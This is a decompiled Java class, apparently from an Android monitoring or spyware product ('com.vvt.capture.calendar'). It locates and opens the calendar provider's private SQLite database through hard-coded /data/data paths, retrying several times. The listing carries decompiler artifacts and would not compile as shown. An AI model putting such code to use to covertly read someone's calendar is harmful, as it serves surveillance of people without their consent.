package com.vvt.capture.calendar.a;

import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteException;
import android.os.SystemClock;
import java.io.File;

public class a
{
  private static final boolean a = com.vvt.capture.calendar.d.a;
  private static final boolean b = com.vvt.capture.calendar.d.b;
  private static final boolean c = com.vvt.capture.calendar.d.e;
  private static final File[] d;
  private static String e = null;
  
  static
  {
    File[] arrayOfFile = new File[3];
    File localFile = new java/io/File;
    localFile.<init>("/data/data/com.android.providers.calendar/databases/");
    arrayOfFile[0] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/dbdata/databases/com.android.providers.calendar/");
    arrayOfFile[1] = localFile;
    localFile = new java/io/File;
    localFile.<init>("/data/data/com.motorola.blur.providers.calendar/databases/");
    arrayOfFile[2] = localFile;
    d = arrayOfFile;
  }
  
  public static SQLiteDatabase a()
  {
    return a(17);
  }
  
  private static SQLiteDatabase a(int paramInt)
  {
    boolean bool1 = a;
    if (bool1) {}
    Object localObject1 = e;
    Object localObject3;
    if (localObject1 == null)
    {
      localObject1 = new java/lang/StringBuilder;
      ((StringBuilder)localObject1).<init>();
      localObject2 = d;
      localObject3 = "calendar";
      String str = "db";
      k = com.vvt.io.d.a((File[])localObject2, (String)localObject3, (StringBuilder)localObject1, str);
      boolean bool5 = b;
      if (bool5) {}
      bool5 = b;
      if ((bool5) && (k == 0)) {
        break label148;
      }
      localObject1 = ((StringBuilder)localObject1).toString();
      e = (String)localObject1;
      bool1 = a;
      if (!bool1) {}
    }
    Object localObject2 = b(paramInt);
    int i = 5;
    localObject1 = localObject2;
    int k = i;
    while ((localObject1 == null) && (k > 0))
    {
      boolean bool2 = a;
      if (bool2) {}
      long l = 1000L;
      SystemClock.sleep(l);
      localObject3 = b(paramInt);
      int j = k + -1;
      k = j;
      localObject1 = localObject3;
      continue;
      label148:
      boolean bool3 = c;
      if (bool3) {}
      bool3 = false;
      localObject1 = null;
    }
    for (;;)
    {
      return (SQLiteDatabase)localObject1;
      boolean bool4 = a;
      if (!bool4) {}
    }
  }
  
  private static SQLiteDatabase b(int paramInt)
  {
    SQLiteDatabase localSQLiteDatabase = null;
    try
    {
      Object localObject = new java/io/File;
      String str = e;
      ((File)localObject).<init>(str);
      boolean bool = ((File)localObject).exists();
      if (!bool) {}
      localObject = e;
      str = null;
      localSQLiteDatabase = SQLiteDatabase.openDatabase((String)localObject, null, paramInt);
    }
    catch (SQLiteException localSQLiteException)
    {
      for (;;) {}
    }
    return localSQLiteDatabase;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/calendar/a/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */